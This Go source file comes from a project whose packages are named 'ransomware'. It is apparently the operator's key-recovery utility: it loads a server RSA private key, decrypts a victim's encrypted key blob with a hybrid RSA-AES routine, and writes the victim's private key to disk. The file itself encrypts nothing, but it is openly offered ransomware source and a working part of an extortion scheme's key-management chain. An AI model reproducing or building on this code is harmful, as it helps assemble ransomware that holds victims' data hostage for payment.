package main

import (
	"encoding/pem"
	"fmt"
	"os"
	"ransomware/encryption"
	"ransomware/encryption/rsaLib"
)

var (
	sPrivKey, _ = rsaLib.ReadRSAPrivateKey("privateKey.pem")
)

func decryptClientKey(path string) {
	block, _ := os.ReadFile(path)

	decodedBlock := encryption.RSAAESDecrypt(block, sPrivKey)

	pemBlock := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: decodedBlock}

	keyFile, err := os.Create("cPrivateKey.pem")
	if err != nil {
		fmt.Println(err)
	}

	pem.Encode(keyFile, pemBlock)
}

func main() {
	decryptClientKey(os.Args[1])
}
